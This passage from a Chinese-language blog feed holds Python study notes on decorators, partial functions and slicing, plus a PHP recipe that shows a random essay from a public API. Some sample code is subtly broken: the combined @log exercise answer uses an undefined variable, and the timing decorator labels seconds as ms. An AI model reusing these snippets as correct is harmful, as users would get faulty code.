decorator，可以定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def log(func):</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&#x27;call %s():&#x27; % func.__name__)</span><br><span class="line">        return func(*args, **kw)</span><br><span class="line">    return wrapper</span><br></pre></td></tr></table></figure><p>观察上面的<code>log</code>，因为它是一个 decorator，所以接受一个函数作为参数，并返回一个函数。我们要借助 Python 的 @ 语法，把 decorator 置于函数的定义处：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log</span><br><span class="line">def now():</span><br><span class="line">    print(&#x27;2020-07-19&#x27;)</span><br></pre></td></tr></table></figure><p>调用<code>now()</code>函数，不仅会运行<code>now()</code>函数本身，还会在运行<code>now()</code>函数前打印一行日志：</p><p><img src="https://cos.gjcloak.xyz/images01/20200719083113.png" alt="image-20200719083104800" title="image-20200719083104800"></p><p>把<code>@log</code>放到<code>now()</code>函数的定义处，相当于执行了语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">now = log(now)</span><br></pre></td></tr></table></figure><p>由于<code>log()</code>是一个 decorator，返回一个函数，所以，原来的<code>now()</code>函数仍然存在，只是现在同名的<code>now</code>变量指向了新的函数，于是调用<code>now()</code>将执行新函数，即在<code>log()</code>函数中返回的<code>wrapper()</code>函数。</p><p><code>wrapper()</code>函数的参数定义是<code>(*args, **kw)</code>，因此，<code>wrapper()</code>函数可以接受任意参数的调用。在<code>wrapper()</code>函数内，首先打印日志，再紧接着调用原始函数。</p><p>如果 decorator 本身需要传入参数，那就需要编写一个返回 decorator 的高阶函数，写出来会更复杂。比如，要自定义 log 的文本：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def log(text):</span><br><span class="line">    def decorator(func):</span><br><span class="line">        def wrapper(*args, **kw):</span><br><span class="line">            print(&#x27;%s %s():&#x27; % (text, func.__name__))</span><br><span class="line">            return func(*args, **kw)</span><br><span class="line">        return wrapper</span><br><span class="line">    return decorator</span><br></pre></td></tr></table></figure><p>这个 3 层嵌套的 decorator 用法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log(&#x27;execute&#x27;)</span><br><span class="line">def now():</span><br><span class="line">    print(&#x27;2020-07-19&#x27;)</span><br></pre></td></tr></table></figure><p>执行结果如下：</p><p><img src="https://cos.gjcloak.xyz/images01/20200719084715.png" alt="image-20200719084700178" title="image-20200719084700178"></p><p>和两层嵌套的 decorator 相比，3 层嵌套的效果是这样的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; now = log(&#x27;execute&#x27;)(now)</span><br></pre></td></tr></table></figure><p>我们来剖析上面的语句，首先执行<code>log(&#39;execute&#39;)</code>，返回的是<code>decorator</code>函数，再调用返回的函数，参数是<code>now</code>函数，返回值最终是<code>wrapper</code>函数。</p><p>以上两种 decorator 的定义都没有问题，但还差最后一步。因为我们讲了函数也是对象，它有<code>__name__</code>等属性，但你去看经过 decorator 装饰之后的函数，它们的<code>__name__</code>已经从原来的<code>&#39;now&#39;</code>变成了<code>&#39;wrapper&#39;</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; now.__name__</span><br><span class="line">&#x27;wrapper&#x27;</span><br></pre></td></tr></table></figure><p>因为返回的那个<code>wrapper()</code>函数名字就是<code>&#39;wrapper&#39;</code>，所以，需要把原始函数的<code>__name__</code>等属性复制到<code>wrapper()</code>函数中，否则，有些依赖函数签名的代码执行就会出错。</p><p>不需要编写<code>wrapper.__name__ = func.__name__</code>这样的代码，Python 内置的<code>functools.wraps</code>就是干这个事的，所以，一个完整的 decorator 的写法如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import functools</span><br><span class="line"></span><br><span class="line">def log(func):</span><br><span class="line">    @functools.wraps(func)</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&#x27;call %s():&#x27; % func.__name__)</span><br><span class="line">        return func(*args, **kw)</span><br><span class="line">    return wrapper</span><br></pre></td></tr></table></figure><p>或者针对带参数的 decorator：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import functools</span><br><span class="line"></span><br><span class="line">def log(text):</span><br><span class="line">    def decorator(func):</span><br><span class="line">        @functools.wraps(func)</span><br><span class="line">        def wrapper(*args, **kw):</span><br><span class="line">            print(&#x27;%s %s():&#x27; % (text, func.__name__))</span><br><span class="line">            return func(*args, **kw)</span><br><span class="line">        return wrapper</span><br><span class="line">    return decorator</span><br></pre></td></tr></table></figure><p><code>import functools</code>是导入<code>functools</code>模块。模块的概念稍候讲解。现在，只需记住在定义<code>wrapper()</code>的前面加上<code>@functools.wraps(func)</code>即可。</p><blockquote><p>练习题：</p></blockquote><p>请设计一个 decorator，它可作用于任何函数上，并打印该函数的执行时间：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import time, functools</span><br><span class="line">def metric(fn):</span><br><span class="line">    @functools.wraps(fn)</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        e = fn(*args, **kw)</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        print(&#x27;%s executed in %s ms&#x27; % (fn.__name__, end_time - start_time))</span><br><span class="line">        return e</span><br><span class="line">    return wrapper</span><br></pre></td></tr></table></figure><p>测试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 测试</span><br><span class="line">@metric</span><br><span class="line">def fast(x, y):</span><br><span class="line">    time.sleep(0.0012)</span><br><span class="line">    return x + y;</span><br><span class="line"></span><br><span class="line">@metric</span><br><span class="line">def slow(x, y, z):</span><br><span class="line">    time.sleep(0.1234)</span><br><span class="line">    return x * y * z;</span><br><span class="line"></span><br><span class="line">f = fast(11, 22)</span><br><span class="line">s = slow(11, 22, 33)</span><br><span class="line">if f != 33:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br><span class="line">elif s != 7986:</span><br><span class="line">    print(&#x27;测试失败!&#x27;)</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200719091405.png" alt="image-20200719091357306" title="image-20200719091357306"></p><blockquote><p>小结：</p></blockquote><p>在面向对象（OOP）的设计模式中，decorator 被称为装饰模式。OOP 的装饰模式需要通过继承和组合来实现，而 Python 除了能支持 OOP 的 decorator 外，直接从语法层次支持 decorator。Python 的 decorator 可以用函数实现，也可以用类实现。</p><p>decorator 可以增强函数的功能，定义起来虽然有点复杂，但使用起来非常灵活和方便。</p><p>再思考一下能否写出一个<code>@log</code>的 decorator，使它既支持：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log</span><br><span class="line">def f():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>又支持：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@log(&#x27;execute&#x27;)</span><br><span class="line">def f():</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><p>eg.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def log(text):</span><br><span class="line">    if isinstance(text, str):</span><br><span class="line">        def decorator(func):</span><br><span class="line">            @functools.wraps(func)</span><br><span class="line">            def wrapper(*args, **kw):</span><br><span class="line">                print(&#x27;%s %s(): &#x27; % (text, func.__name__))</span><br><span class="line">                return func(*args, **kw)</span><br><span class="line">            return wrapper</span><br><span class="line">        return decorator</span><br><span class="line">    def wrapper(*args, **kw):</span><br><span class="line">        print(&#x27;%s %s(): &#x27; % (text, func.__name__))</span><br><span class="line">        return func(*args, **kw)</span><br><span class="line">    return wrapper</span><br></pre></td></tr></table></figure><h2 id="4-6-偏函数"><a href="#4-6-偏函数" class="headerlink" title="4.6 偏函数"></a>4.6 偏函数</h2><p>Python 的<code>functools</code>模块提供了很多有用的功能，其中一个就是偏函数（Partial function）。要注意，这里的偏函数和数学意义上的偏函数不一样。</p><p>在介绍函数参数的时候，我们讲到，通过设定参数的默认值，可以降低函数调用的难度。而偏函数也可以做到这一点。举例如下：</p><p><code>int()</code>函数可以把字符串转换为整数，当仅传入字符串时，<code>int()</code>函数默认按十进制转换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(&#x27;12345&#x27;)</span><br><span class="line">12345</span><br></pre></td></tr></table></figure><p>但<code>int()</code>函数还提供额外的<code>base</code>参数，默认值为<code>10</code>。如果传入<code>base</code>参数，就可以做 N 进制的转换：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int(&#x27;12345&#x27;, base=8)</span><br><span class="line">5349</span><br><span class="line">&gt;&gt;&gt; int(&#x27;12345&#x27;, 16)</span><br><span class="line">74565</span><br></pre></td></tr></table></figure><p>假设要转换大量的二进制字符串，每次都传入<code>int(x, base=2)</code>非常麻烦，于是，我们想到，可以定义一个<code>int2()</code>的函数，默认把<code>base=2</code>传进去：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def int2(x, base=2):</span><br><span class="line">    return int(x, base)</span><br></pre></td></tr></table></figure><p>这样，我们转换二进制就非常方便了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int2(&#x27;1000000&#x27;)</span><br><span class="line">64</span><br><span class="line">&gt;&gt;&gt; int2(&#x27;1010101&#x27;)</span><br><span class="line">85</span><br></pre></td></tr></table></figure><p><code>functools.partial</code>就是帮助我们创建一个偏函数的，不需要我们自己定义<code>int2()</code>，可以直接使用下面的代码创建一个新的函数<code>int2</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import functools</span><br><span class="line">&gt;&gt;&gt; int2 = functools.partial(int, base=2)</span><br><span class="line">&gt;&gt;&gt; int2(&#x27;1000000&#x27;)</span><br><span class="line">64</span><br><span class="line">&gt;&gt;&gt; int2(&#x27;1010101&#x27;)</span><br><span class="line">85</span><br></pre></td></tr></table></figure><p>所以，简单总结<code>functools.partial</code>的作用就是，把一个函数的某些参数给固定住（也就是设置默认值），返回一个新的函数，调用这个新函数会更简单。</p><p>注意到上面的新的<code>int2</code>函数，仅仅是把<code>base</code>参数重新设定默认值为<code>2</code>，但也可以在函数调用时传入其他值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; int2(&#x27;1000000&#x27;, base=10)</span><br><span class="line">1000000</span><br></pre></td></tr></table></figure><p>最后，创建偏函数时，实际上可以接收函数对象、<code>*args</code>和<code>**kw</code>这 3 个参数，当传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int2 = functools.partial(int, base=2)</span><br></pre></td></tr></table></figure><p>实际上固定了 int() 函数的关键字参数<code>base</code>，也就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int2(&#x27;10010&#x27;)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kw = &#123; &#x27;base&#x27;: 2 &#125;</span><br><span class="line">int(&#x27;10010&#x27;, **kw)</span><br></pre></td></tr></table></figure><p>当传入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max2 = functools.partial(max, 10)</span><br></pre></td></tr></table></figure><p>实际上会把<code>10</code>作为<code>*args</code>的一部分自动加到左边，也就是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">max2(5, 6, 7)</span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">args = (10, 5, 6, 7)</span><br><span class="line">max(*args)</span><br></pre></td></tr></table></figure><p>结果为<code>10</code>。</p><p><img src="https://cos.gjcloak.xyz/images01/20200719101153.png" alt="image-20200719101140248" title="image-20200719101140248"></p><blockquote><p>小结：</p></blockquote><p>当函数的参数个数太多，需要简化时，使用<code>functools.partial</code>可以创建一个新的函数，这个新函数可以固定住原函数的部分参数，从而在调用时更简单。</p><h2 id="4-7-参考资料"><a href="#4-7-参考资料" class="headerlink" title="4.7 参考资料"></a>4.7 参考资料</h2><ul><li><a href="https://www.liaoxuefeng.com/wiki/1016959663602400/1017328525009056">廖雪峰 - Python 3.x - 函数式编程</a></li><li><a href="http://www.ruanyifeng.com/blog/2012/04/functional_programming.html">阮一峰 - 函数式编程初探</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
            <tag> python </tag>
            
            <tag> 函数式编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客通过 API 实现&#39;随机美文&#39;</title>
      <link href="/96.html"/>
      <url>/96.html</url>
      
        <content type="html"><![CDATA[<h1 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h1><p>随机美文的API地址是<a href="https://alapi.cn/api/view/36">这个</a></p><p>复制主题的page页面，并添加下面代码在头部</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * 随机美文</span><br><span class="line"> * </span><br><span class="line"> * @package custom </span><br><span class="line"> * </span><br><span class="line"> **/</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>再把<code>&lt;?php $this-&gt;need(&#39;public/article.php&#39;); ?&gt;</code>代码替换成如下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$curl = curl_init();</span><br><span class="line">curl_setopt_array($curl, array(</span><br><span class="line">  CURLOPT_URL =&gt; &quot;https://v2.alapi.cn/api/mryw/random&quot;,</span><br><span class="line">  CURLOPT_RETURNTRANSFER =&gt; true,</span><br><span class="line">  CURLOPT_ENCODING =&gt; &quot;&quot;,</span><br><span class="line">  CURLOPT_MAXREDIRS =&gt; 10,</span><br><span class="line">  CURLOPT_TIMEOUT =&gt; 30,</span><br><span class="line">  CURLOPT_HTTP_VERSION =&gt; CURL_HTTP_VERSION_1_1,</span><br><span class="line">  CURLOPT_CUSTOMREQUEST =&gt; &quot;POST&quot;,</span><br><span class="line">  CURLOPT_POSTFIELDS =&gt; &quot;token=用户中心获取token&quot;,</span><br><span class="line">  CURLOPT_HTTPHEADER =&gt; array(</span><br><span class="line">    &quot;Content-Type: application/x-www-form-urlencoded&quot;,</span><br><span class="line">  ),</span><br><span class="line">));</span><br><span class="line">$response = curl_exec($curl);</span><br><span class="line">$err = curl_error($curl);</span><br><span class="line">curl_close($curl);</span><br><span class="line">if ($err) &#123;</span><br><span class="line">  echo &quot;cURL Error #:&quot; . $err;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">  echo $response;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>然后在 <code>$err = curl_error($curl);</code> 后面添加以下代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$a=json_decode($response,true);</span><br></pre></td></tr></table></figure><p>最后，把<code>echo $response;</code>替换成如下代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;&lt;div style=&#x27;text-align:center;&#x27;&gt;&lt;span style=&#x27;font-size:30px;&#x27;&gt;&quot; . $a[&#x27;data&#x27;][&#x27;title&#x27;] . &quot;&lt;/span&gt;&lt;/div&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div&gt;&lt;span&gt;&quot; . $a[&#x27;data&#x27;][&#x27;content&#x27;] . &quot;&lt;/span&gt;&lt;/div&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div style=&#x27;text-align:right;&#x27;&gt;&lt;span style=&#x27;font-size:16px;&#x27;&gt;&quot; . $a[&#x27;data&#x27;][&#x27;author&#x27;] . &quot;&lt;/span&gt;&lt;/div&gt;&quot;;</span><br><span class="line">echo &quot;&lt;div style=&#x27;text-align:right;&#x27;&gt;&lt;span style=&#x27;font-size:16px;&#x27;&gt;&quot; . $a[&#x27;data&#x27;][&#x27;up_date&#x27;] . &quot;&lt;/span&gt;&lt;/div&gt;&quot;;</span><br></pre></td></tr></table></figure><p>当然这个替换代码可以根据自己需要进行增减修改</p><h1 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h1><p>新建页面，选择模板为 <code>随机美文</code><br>在查看下页面是否正常，无误则实现了随机美文</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客 </tag>
            
            <tag> api </tag>
            
            <tag> 随机美文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python学习笔记(三)·高级特性</title>
      <link href="/95.html"/>
      <url>/95.html</url>
      
        <content type="html"><![CDATA[<p>掌握了 Python 的数据类型、语句和函数，基本上就可以编写出很多有用的程序了。</p><p>比如构造一个<code>1, 3, 5, 7, ..., 99</code>的列表，可以通过循环实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">L = []</span><br><span class="line">n = 1</span><br><span class="line">while n &lt;= 99:</span><br><span class="line">    L.append(n)</span><br><span class="line">    n = n + 2</span><br><span class="line">print(L)</span><br></pre></td></tr></table></figure><p>? 使用<strong>列表生成式</strong>，来解决这个问题：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">list = [i for i in range(1,101,2)]</span><br><span class="line">print(list)</span><br></pre></td></tr></table></figure><p>取 list 的前一半的元素，也可以通过循环实现。</p><p>但是在 Python 中，代码不是越多越好，而是越少越好。代码不是越复杂越好，而是越简单越好。</p><p>基于这一思想，我们来介绍 Python 中非常有用的高级特性，<strong>1 行代码能实现的功能，决不写 5 行代码。</strong>请始终牢记，代码越少，开发效率越高。</p><h2 id="3-1-切片"><a href="#3-1-切片" class="headerlink" title="3.1 切片"></a>3.1 切片</h2><h3 id="3-1-1-list-切片"><a href="#3-1-1-list-切片" class="headerlink" title="3.1.1 list 切片"></a>3.1.1 list 切片</h3><p>取一个 list 或 tuple 的部分元素是非常常见的操作。比如，一个 list 如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L = [&#x27;Michael&#x27;, &#x27;Sarah&#x27;, &#x27;Tracy&#x27;, &#x27;Bob&#x27;, &#x27;Jack&#x27;]</span><br></pre></td></tr></table></figure><p>取前 3 个元素，应该怎么做？</p><p>可能会像这样解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[L[0],L[1],L[2]]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712160939.png" alt="image-20200712160938388" title="image-20200712160938388"></p><p>但是，如果是取前 N 个元素就没辙了。</p><p>? 取前 N 个元素，也就是索引为 0-(N-1) 的元素，可以用循环：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r = []</span><br><span class="line">n = 3</span><br><span class="line">for i in range(n):</span><br><span class="line">    r.append(L[i])</span><br><span class="line">r</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712214350.png" alt="image-20200712214348838" title="image-20200712214348838"></p><p>对这种经常取指定索引范围的操作，用循环十分繁琐，因此，Python 提供了切片（Slice）操作符，能大大简化这种操作。</p><p>对应上面的问题，取前 3 个元素，用一行代码就可以完成切片：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[0:3]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712214633.png" alt="image-20200712214632198" title="image-20200712214632198"></p><p><code>L[0:3]</code>表示，从索引<code>0</code>开始取，直到索引<code>3</code>为止，但不包括索引<code>3</code>。即索引<code>0</code>，<code>1</code>，<code>2</code>，正好是 3 个元素。</p><p>如果第一个索引是<code>0</code>，还可以省略：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[:3]</span><br></pre></td></tr></table></figure><p>也可以从索引 1 开始，取出 2 个元素出来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[1:3]</span><br></pre></td></tr></table></figure><p>类似的，既然 Python 支持<code>L[-1]</code>取倒数第一个元素，那么它同样支持倒数切片，试试：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[-2:]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712220307.png" alt="image-20200712220306806" title="image-20200712220306806"></p><p>记住倒数第一个元素的索引是<code>-1</code>。</p><p>⭐ 切片格式：<strong>[开头：结束：步长]</strong></p><ul><li><p><strong>开头</strong>：当步长 &gt;0 时，开头不写默认 0，即从第一位开始切片</p><p>当步长 &lt; 0时，开头不写默认 -1 ，即从最后一位开始倒着切片</p></li><li><p><strong>结束</strong>：当步长 &gt; 0 时，结束不写默认为列表长度加一，即切片到最后一位结束</p><p>当步长 &lt; 0 时，结束不写默认为负的列表长度减一，即倒着切片到第一位结束</p></li><li><p><strong>步长：默认为1，&gt; 0 是从左往右走，&lt; 0 是从右往左走</strong></p></li></ul><p>? 切片操作十分有用。我们先创建一个 0 - 99 的数列：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L = list(range(100))</span><br><span class="line">L</span><br></pre></td></tr></table></figure><p>可以通过切片轻松取出某一段数列。比如前 10 个数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[:10]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712220548.png" alt="image-20200712220546937" title="image-20200712220546937"></p><p>后 10 个数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[-10:]</span><br></pre></td></tr></table></figure><p>前 11 - 20 个数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[10:20]</span><br></pre></td></tr></table></figure><p>前 10 个数，每两个取一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[:10:2]</span><br></pre></td></tr></table></figure><p>所有数，每 5 个取一个：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[::5]</span><br></pre></td></tr></table></figure><p>甚至什么都不写，只写<code>[:]</code>就可以原样复制一个 list：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L[:]</span><br></pre></td></tr></table></figure><h3 id="3-1-2-tuple-切片"><a href="#3-1-2-tuple-切片" class="headerlink" title="3.1.2 tuple 切片"></a>3.1.2 tuple 切片</h3><p>!&gt; tuple 也是一种 list，唯一区别是 tuple 不可变。因此，tuple 也可以用切片操作，只是操作的结果仍是 tuple：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(0, 1, 2, 3, 4, 5)[:3]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/NoteBook/20200712222248.png" alt="image-20200712222247480" title="image-20200712222247480"></p><h3 id="3-1-3-str-切片"><a href="#3-1-3-str-切片" class="headerlink" title="3.1.3 str 切片"></a>3.1.3 str 切片</h3><p>字符串<code>&#39;xxx&#39;</code>也可以看成是一种 list，每个元素就是一个字符。因此，字符串也可以用切片操作，只是操作结果仍是字符串：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;ABCDEFG&#x27;[:3]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200712222834.png" alt="image-20200712222833885" title="image-20200712222833885"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;ABCDEFG&#x27;[::2]</span><br></pre></td></tr></table></figure><p><img src="https://cos.gjcloak.xyz/images01/20200712223100.png" alt="image-20200712223059989" title="image-20200712223059989"></p><p>在很多编程语言中，针对字符串提供了很多各种截取函数（例如，substring），其实目的就是对字符串切片。Python 没有针对字符串的截取函数，只需要切片一个操作就可以完成，非常简单。</p><blockquote><p>✏️ 练习题：</p></blockquote><p>利用切片操作，实现一个 trim() 函数，去除字符串首尾的空格，注意不要调用 str 的<code>strip()</code>方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def trim(s):</span><br><span class="line">    while s[:1] == &#x27; &#x27;:</span><br><span class="line">        s = s[1:]</span><br><span class="line">    while s[-1:] == &#x27; 